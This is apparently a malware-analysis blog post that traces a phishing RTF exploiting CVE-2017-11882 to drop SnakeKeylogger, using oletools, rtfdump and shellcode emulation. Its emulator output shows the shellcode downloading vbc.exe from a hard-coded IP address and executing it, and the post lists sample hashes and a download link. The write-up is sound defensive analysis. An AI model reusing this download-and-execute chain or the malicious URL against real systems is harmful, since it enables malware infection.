---
title: SnakeKeylogger Analyst
date: 2023-09-28 14:05:11 GMT+7
categories: [DFIR, SIEM, Security, Email Phishing, Analyst, CVE-2017-11882, Malware]
tags: [Email Phishing, Security, SOC, CVE-2017-11882, SnakeKeylogger]     # TAG names should always be lowercase
---

- ![Phishing Email Meme](https://miro.medium.com/v2/resize:fit:620/1*a1wCMVt1O3Dh-1efGILVHA.jpeg)

## 1. Brief Introduction
- The initial delivery was via email.
    - The high level killchain is as follows:
        - Spam/Phishing email
        - Contains a malicious document
        - Downloads a remote template
        - Exploits Equation Editor vulnerability
        - Drops SnakeKeylogger.
        
## 2. Diving into the initial document
- We are going to use oleid to see if the document is encrypted, has VBA Macros / XLM Macros or External Relationships embedded.
- The oletools suite is a package of python tools to analyze Microsoft OLE2 files (also called Structured Storage, Compound File Binary Format or Compound Document File Format), such as Microsoft Office documents or Outlook messages, mainly for malware analysis and debugging.
```
remnux@remnux:~/Desktop/Malz$ oleid e9e38b2108b6dc9911fac6c1e6bf7b8fa017847f56ceeab19b96f187db9e5bac.rtf 
XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
oleid 0.60.1 - http://decalage.info/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues

Filename: e9e38b2108b6dc9911fac6c1e6bf7b8fa017847f56ceeab19b96f187db9e5bac.rtf
--------------------+--------------------+----------+--------------------------
Indicator           |Value               |Risk      |Description               
--------------------+--------------------+----------+--------------------------
File format         |Rich Text Format    |info      |                          
--------------------+--------------------+----------+--------------------------
Container format    |RTF                 |info      |Container type            
--------------------+--------------------+----------+--------------------------
Encrypted           |False               |none      |The file is not encrypted 
--------------------+--------------------+----------+--------------------------
VBA Macros          |No                  |none      |RTF files cannot contain  
                    |                    |          |VBA macros                
--------------------+--------------------+----------+--------------------------
XLM Macros          |No                  |none      |RTF files cannot contain  
                    |                    |          |XLM macros                
--------------------+--------------------+----------+--------------------------
External            |0                   |none      |External relationships    
Relationships       |                    |          |such as remote templates, 
                    |                    |          |remote OLE objects, etc   
--------------------+--------------------+----------+--------------------------
```
- Many malicious RTF files are obfuscated, making it difficult for tools like rtfobj or rtfdump to accurately identify OLE objects. In particular, rtfdump may encounter issues and display the message "Not a well-formed OLE object." However, rtfdump does offer an option that can assist in decoding objects that are not well-formed.
- Upon closer examination of this sample, rtfdump fails to identify any OLE objects. However, the presence of the "h=" indicator indicates the presence of numerous hexadecimal characters. We will focus our attention on Level 4, as it contains the innermost nested object with 15067 hex characters. If we are unable to find what we are looking for, we can always explore the other objects.
```
remnux@remnux:~/Desktop/Malz$ rtfdump.py e9e38b2108b6dc9911fac6c1e6bf7b8fa017847f56ceeab19b96f187db9e5bac.rtf 
    1 Level  1        c=    2 p=00000000 l=   15181 h=    8316;      28 b=       0   u=       1 \rtf1
    2  Level  2       c=    0 p=00000010 l=      30 h=      12;       9 b=       0   u=       8 \*\line
    3  Level  2       c=    1 p=00000031 l=   15131 h=    8316;      28 b=       0   u=       1 
    4   Level  3      c=    3 p=00000070 l=   15067 h=    8316;      28 b=       0   u=       1 \*\objdata962147
    5    Level  4     c=    0 p=00000081 l=      50 h=      18;      18 b=       0   u=       0 \*\objtime791370744
    6    Level  4     c=    0 p=000000b6 l=      51 h=      18;      18 b=       0   u=       0 \*\xmlattr690591092
    7    Level  4     c=    1 p=00000207 l=     200 h=       0;      27 b=       0   u=       0 \object
    8     Level  5    c=    0 p=00000281 l=      77 h=       0;      22 b=       0   u=       0 
```
- a quick breakdown of the below command is as follows:
```
-s3: select item nr for dumping, in our case Level 3
-H: decode hexadecimal data
```
- I want to focus on the following lines, executing this command just showed a bunch of blob, nothing is readable, and left me going back to rtfdump’s documents trying to figure out why it can’t properly decode these hex values.
- The word hexshift caught my eye, the parameter in rtfdump is ``--hexshift shift one nibble``, which made so much sense, let’s execute the same command with the hexshift and look at the output and also draw it out:
```
remnux@remnux:~/Desktop/Malz$ rtfdump.py -s4 -H e9e38b2108b6dc9911fac6c1e6bf7b8fa017847f56ceeab19b96f187db9e5bac.rtf 
<snip>
00000420: FF FF FF FF FF FF FF FF  FF FF FF FF FF FF FF FF  ................
00000430: FF FF FF FF FF FF 52 00  6F 00 6F 00 74 00 20 00  ......R.o.o.t. .
00000440: 45 00 6E 00 74 00 72 00  79 00 00 00 00 00 00 00  E.n.t.r.y.......
00000450: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000460: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000470: 00 00 00 00 00 00 16 00  05 00 FF FF FF FF FF FF  ................
00000480: FF FF 01 00 00 00 02 CE  02 00 00 00 00 00 C0 00  ................
00000490: 00 00 00 00 00 46 00 00  00 00 00 00 00 00 00 00  .....F..........
000004A0: 00 00 E0 5F 25 66 9B CD  D8 01 03 00 00 00 40 07  ..._%f........@.
000004B0: 00 00 00 00 00 00 01 00  6F 00 6C 00 45 00 31 00  ........o.l.E.1.
000004C0: 30 00 6E 00 61 00 54 00  49 00 76 00 65 00 00 00  0.n.a.T.I.v.e...
000004D0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000004E0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
<snip>
```
- So what does shift one nibble mean? ``-S`` , You should to use shift if u don't see anything Root
```
00000460: FF FF FF F5 20 06 F0 06  F0 07 40 02 00 04 50 06  .... .....@...P.
                    | 
                     _ < Shift one nibble to the left
                      |
00000460: FF FF FF FF 52 00 6F 00  6F 00 74 00 20 00 45 00  ....R.o.o.t. .E.
```
- Let’s dump that section and also dump it in raw format using the ``-d`` parameter:
```
remnux@remnux:~/Desktop/Malz$ rtfdump.py -s4 -H e9e38b2108b6dc9911fac6c1e6bf7b8fa017847f56ceeab19b96f187db9e5bac.rtf -d > malware.dump 
```
```
@remnux:~/Desktop/Malz$ oledump.py malware.dump 
Error: malware.dump is nota valid OLE file.
```
- Let's check file dump, file dump not matches header of OLE file.
- To extract from the COM object header onward, we can do the following:
```
remnux@remnux:~/Desktop/Malz$ rtfdump.py -s4 -H e9e38b2108b6dc9911fac6c1e6bf7b8fa017847f56ceeab19b96f187db9e5bac.rtf -c 0x36: -d > malware.dump 
remnux@remnux:~/Desktop/Malz$ oledump.py malware.dump 
  1:      1794 '\x01olE10naTIve'
```
- I was about to mention that SnakeKeylogger makes use of CVE-2017-11882, but there is another tool from oletools called oledir, which displays all the directory entries of an OLE file. However this CLSID 0002CE02-0000-0000-C000-000000000046 is a clear giveaway of this CVE being at play here.
```
remnux@remnux:~/Desktop/Malz$ oledir malware.dump 
oledir 0.54 - http://decalage.info/python/oletools
OLE directory entries in file malware.dump:
----+------+-------+----------------------+-----+-----+-----+--------+------
id  |Status|Type   |Name                  |Left |Right|Child|1st Sect|Size  
----+------+-------+----------------------+-----+-----+-----+--------+------
0   |<Used>|Root   |Root Entry            |-    |-    |1    |3       |1856  
1   |<Used>|Stream |\x01olE10naTIve       |-    |-    |-    |0       |1794  
2   |unused|Empty  |                      |-    |-    |-    |0       |0     
3   |unused|Empty  |                      |-    |-    |-    |0       |0     
----+----------------------------+------+--------------------------------------
id  |Name                        |Size  |CLSID                                 
----+----------------------------+------+--------------------------------------
0   |Root Entry                  |-     |0002CE02-0000-0000-C000-000000000046  
    |                            |      |Microsoft Equation 3.0 (Known Related 
    |                            |      |to CVE-2017-11882 or CVE-2018-0802)   
1   |\x01olE10naTIve             |1794  |                                     
```
## 2. Detecting the shellcode
- For doing this let’s make use of a tool called scdbgc, a brief explanation of that the tool is:

> scdbg is a shellcode analysis application built around the libemu emulation library.

- Basically it analyzes shellcode by emulating its execution. You have 2 versions of this tool, scdbgc is the commandline equivalent of scdbg.

- So we will use 2 parameters with scdbgc:
```
/f fpath  load shellcode from file - accepts binary, %u, \x, %x, hex blob
/findsc   detect possible shellcode buffers (brute force) (supports -dump, -disasm)
```
- Result ``http://107.172.61.141/400/vbc.exe``
```
remnux@remnux:~/Desktop/Malz$ scdbgc /f malware.dump -findsc
Loaded 1008 bytes from file malware.dump
Testing 4104 offsets  |  Percent Complete: 99%  |  Completed in 385 ms
0) offset=0x93c        steps=MAX    final_eip=7c80ae40   GetProcAddress
1) offset=0xae5        steps=MAX    final_eip=7c80ae40   GetProcAddress

Select index to execute:: (int/reg) 0
0
Loaded 1008 bytes from file malware.dump
Initialization Complete..
Max Steps: 2000000
Using base offset: 0x401000
Execution starts at file offset 93c
40193c	58                              pop eax
40193d	E9A4010000                      jmp 0x401ae6  vv
401942	828F9C463744C1                  or byte [edi+0x4437469c],0xc1
401949	EC                              in al,dx
40194a	AA                              stosb 


401d0f	GetProcAddress(ExpandEnvironmentStringsW)
401d42	ExpandEnvironmentStringsW(%PUBLIC%\vbc.exe, dst=12fbdc, sz=104)
401d57	LoadLibraryW(UrlMon)
401d72	GetProcAddress(URLDownloadToFileW)
401dc8	URLDownloadToFileW(http://107.172.61.141/400/vbc.exe, C:\users\Public\vbc.exe)
401ddf	LoadLibraryW(shell32)
401df5	GetProcAddress(ShellExecuteW)
401e04	unhooked call to shell32.ShellExecuteW	step=39675

Stepcount 39675

```
- And the end, we need to analyst file ``vbc.exe`` to get more IOCs.
- Sample file malware : https://bazaar.abuse.ch/sample/e9e38b2108b6dc9911fac6c1e6bf7b8fa017847f56ceeab19b96f187db9e5bac/
```
IOCs: 
SHA256 hash:	 e9e38b2108b6dc9911fac6c1e6bf7b8fa017847f56ceeab19b96f187db9e5bac
SHA3-384 hash:	 276a598e422566a85df69db9f4f596ffb0145919938400d5acb5ddc7827334d2d7b5e57f5fceea4d675c2321cfaa4de1
SHA1 hash:	 ad741a688d86c35ee6972a6c4fb723a8541807dc
MD5 hash:	 4ca4b59bef307a91d7757d002f4b70a8
humanhash:	 hawaii-failed-mobile-sixteen
File name:	4ca4b59bef307a91d7757d002f4b70a8
```
